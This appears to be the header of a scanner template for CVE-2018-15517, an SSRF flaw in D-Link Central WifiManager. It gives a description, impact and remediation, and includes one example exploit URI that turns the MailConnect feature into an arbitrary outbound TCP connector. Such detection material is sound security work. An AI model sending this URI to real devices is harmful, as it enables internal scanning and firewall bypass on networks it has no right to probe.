id: CVE-2018-15517

info:
  name: D-Link Central WifiManager - Server-Side Request Forgery
  author: gy741
  severity: high
  description: D-Link Central WifiManager is susceptible to server-side request forgery. The MailConnect feature on D-Link Central WiFiManager CWM-100 1.03 r0098 devices is intended to check a connection to an SMTP server but actually allows outbound TCP to any port on any IP address, as demonstrated by an index.php/System/MailConnect/host/127.0.0.1/port/22/secure/ URI. This can undermine accountability of where scan or connections actually came from and or bypass the FW etc. This can be automated via script or using a browser.
  impact: |
    Successful exploitation of this vulnerability could lead to unauthorized access to internal resources, data leakage, and potential compromise of the entire network.
  remediation: |
    Apply the latest security patches or updates provided by D-Link to fix the SSRF vulnerability in Central WifiManager.
